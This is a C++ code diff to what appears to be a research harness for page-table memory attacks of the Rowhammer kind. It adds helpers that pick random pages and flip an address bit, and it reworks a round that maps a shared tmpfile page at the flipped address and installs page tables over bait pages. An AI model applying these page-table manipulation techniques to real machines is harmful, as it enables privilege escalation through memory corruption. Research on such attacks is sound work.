@@ -13,6 +13,95 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <sys/mman.h>
+#include <unordered_set>
+#include <random>
+#include <stdexcept>
+#include <cstdint>   // uintptr_t
+#include <vector>
+#include <algorithm>    // std::find
+#include <iomanip>
+#include <ios>
+#include <iostream>
+
+inline std::vector<void*>
+random_pages_in_block(void* block,
+                      std::size_t block_size,
+                      std::size_t count) {
+    if(block_size == 0)
+        throw std::invalid_argument("block_size must be > 0");
+
+    if(block_size % PAGE_SIZE != 0)
+        throw std::invalid_argument(
+            "block_size must be a multiple of PAGE_SIZE");
+
+    const uintptr_t base = reinterpret_cast<uintptr_t>(block);
+    if(!is_page_aligned(base))
+        throw std::invalid_argument("block is not page-aligned");
+
+    std::size_t pages = block_size / PAGE_SIZE;
+
+    if(count == 0 || count > pages)
+        throw std::invalid_argument("requested page count is out of range");
+
+    // Build [0, 1, 2, …, pages-1], shuffle, and take the first ‘count’.
+    static thread_local std::mt19937_64 rng{ std::random_device{}() };
+
+    std::vector<std::size_t> indices(pages);
+    std::iota(indices.begin(), indices.end(), 0);
+    std::shuffle(indices.begin(), indices.end(), rng);
+
+    std::vector<void*> out;
+    out.reserve(count);
+    for(std::size_t i = 0; i < count; ++i)
+        out.emplace_back(
+            reinterpret_cast<void*>(base + indices[i] * PAGE_SIZE));
+
+    return out;
+}
+
+inline std::size_t
+erase_pages(std::vector<void*>& pages, const std::vector<void*>& victims) {
+    // Fast-path: nothing to do
+    if(victims.empty())
+        return 0;
+
+    // Validate alignment of every victim
+    for(void* p : victims)
+        if(!is_page_aligned(reinterpret_cast<uintptr_t>(p)))
+            throw std::invalid_argument(
+                "erase_pages: address is not page-aligned");
+
+    // Put victims in a hash set for O(1) look-ups
+    std::unordered_set<void*> kill(victims.begin(), victims.end());
+
+    // Stable erase-remove idiom
+    auto new_end = std::remove_if(pages.begin(), pages.end(),
+                                  [&kill](void* p) { return kill.count(p); });
+
+    std::size_t erased = std::distance(new_end, pages.end());
+    pages.erase(new_end, pages.end());
+    return erased;
+}
+
+void* flip_bit(void* addr, unsigned pos) {
+    auto v = reinterpret_cast<uintptr_t>(addr);
+    v ^= (1ULL << pos);
+    return reinterpret_cast<void*>(v);
+}
+
+inline void print_ptr_hex(const char* label, void* ptr)
+{
+    std::ios old_state(nullptr);
+    old_state.copyfmt(std::cout);            // save caller’s formatting
+
+    std::cout << label << ": 0x"
+              << std::hex << std::setw(sizeof(uintptr_t) * 2)
+              << std::setfill('0')
+              << reinterpret_cast<uintptr_t>(ptr)
+              << '\n';
+
+    std::cout.copyfmt(old_state);            // restore formatting
+}
 
 int main() {
     rubench_open();
@@ -24,21 +113,32 @@ int main() {
     for(int round = 0; round < num_rounds; round++) {
         printf("Round %d\n", round);
 
-        void* pageblock = get_4mb_block();
-        void* target    = (void*)((unsigned long)pageblock + TARGET_OFFSET);
-        mlock((void*)(unsigned long)target, PAGE_SIZE);
-        unsigned long target_phys = rubench_va_to_pa(target);
+        void* pageblock   = get_4mb_block();
+        auto random_pages = random_pages_in_block(
+            pageblock, 2 * PAGEBLOCK_SIZE, 100);
+        void* pt_target = random_pages[0];
+        mlock((void*)(unsigned long)pt_target, PAGE_SIZE);
+        unsigned long target_phys = rubench_va_to_pa(pt_target);
+
+        void* file_target = flip_bit(pt_target, 17);
+        random_pages[1] = file_target;
+
+        print_ptr_hex("pt_target", pt_target);
+        print_ptr_hex("file_target", file_target);
 
         const char* buf = "ffffffffffffffff";
         auto fd = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
+        munmap(file_target, PAGE_SIZE);
         write(fd, buf, 8);
-        auto fd_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+        auto fd_ptr = mmap(file_target, PAGE_SIZE, PROT_READ | PROT_WRITE,
                            MAP_SHARED | MAP_POPULATE, fd, 0);
         mlock(fd_ptr, PAGE_SIZE);
 
-        auto addr    = (void*)(SPRAY_START + PAGEBLOCK_SIZE);
-        void* bait_ptr  = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
-        pt_install(bait_ptr, target, addr, fd);
+        auto addr       = (void*)(SPRAY_START + PAGEBLOCK_SIZE);
+        auto bait_pages = strided_addresses(pageblock, 1ULL << 10, PAGE_SIZE);
+        erase_pages(bait_pages, random_pages);
+
+        pt_install(bait_pages, pt_target, addr, fd);
 
         unsigned long value = rubench_read_phys(target_phys);
         auto file_phys      = rubench_va_to_pa(fd_ptr);
